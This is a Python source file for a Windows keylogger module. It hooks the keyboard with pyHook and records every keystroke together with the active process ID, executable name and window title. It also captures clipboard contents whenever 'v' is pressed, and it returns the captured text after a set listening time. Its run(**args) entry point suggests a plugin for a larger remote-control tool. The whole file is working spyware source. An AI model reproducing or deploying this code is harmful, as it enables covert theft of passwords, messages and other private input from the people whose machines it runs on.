from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import threading
import time

"""
   keylogger module for windows
   reads and saves keyboard keystrokes
   dependecies:
       pywin32
       pythoncom
       pyHook
       
   arguments:
       listentime => time keylogger should spend listening before returning the data
   
    “Our mobile phones have become the greatest spy on the planet.” 
    ~ John McAfee
"""


user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
out = ""


def get_current_process():
    hwnd = user32.GetForegroundWindow()

    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value

    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    s = "[PID: %s - %s - %s]\n" % (process_id, executable.value, window_title.value)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    return s


def keyStroke(event):
    global current_window
    global out
    if event.WindowName != current_window:
       current_window = event.WindowName
       out += get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:
        if event.Key.lower() == "v":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            out += "[PASTE|%s] - %s" % (event.Key, pasted_value)
        else:
            out += chr(event.Ascii)
    else:
        out += "[%s]" % event.Key
    return True


def run_keylog():
    k1 = pyHook.HookManager()
    k1.KeyDown = keyStroke
    k1.HookKeyboard()
    pythoncom.PumpMessages()


def run(**args):
    if 'listentime' not in args:
        return None
    global out
    listener = threading.Thread(target=run_keylog)
    listener.start()
    time.sleep(args['listentime'])
    windll.user32.PostQuitMessage(0)
    return out
